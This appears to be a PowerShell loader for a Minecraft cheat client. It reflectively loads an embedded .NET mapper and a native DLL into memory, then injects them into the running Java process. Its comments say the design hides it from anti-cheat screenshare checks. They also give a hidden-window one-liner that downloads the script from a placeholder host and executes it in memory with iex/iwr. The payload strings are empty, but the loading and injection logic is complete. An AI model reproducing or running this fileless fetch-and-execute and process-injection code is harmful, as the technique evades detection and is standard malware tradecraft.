# fileless-inject.ps1 - fileless Echo loader (Prestige-style)
# Reflectively loads a .NET mapper + native payload from memory and injects into
# the running Minecraft JVM WITHOUT writing anything to disk. No LoadLibrary, no
# module record = hidden from screenshare module enumeration.
#
# Launch (Win+R, no PS history, hidden window):
#   powershell -NoProfile -w hidden -c "iex((iwr 'https://HOST/fileless-inject.ps1' -UseBasicParsing).Content)"
#
# The script itself never touches disk when hosted; both payloads are embedded.

param([int]$TargetPid = 0)

$ErrorActionPreference = "SilentlyContinue"

$mapperB64 = ""
$dllB64    = ""

try {
    $mapper = [Reflection.Assembly]::Load([Convert]::FromBase64String($mapperB64))
    $dll    = [Convert]::FromBase64String($dllB64)

    if ($TargetPid -le 0) {
        $p = Get-Process -Name "javaw","java" -ErrorAction SilentlyContinue |
             Sort-Object StartTime | Select-Object -First 1
        if ($p) { $TargetPid = $p.Id }
    }
    if ($TargetPid -le 0) { exit 2 }

    $type = $mapper.GetType("EchoMapper")
    $rc = $type.GetMethod("Inject").Invoke($null, @($TargetPid, $dll))
    exit [int]$rc
}
catch { exit 1 }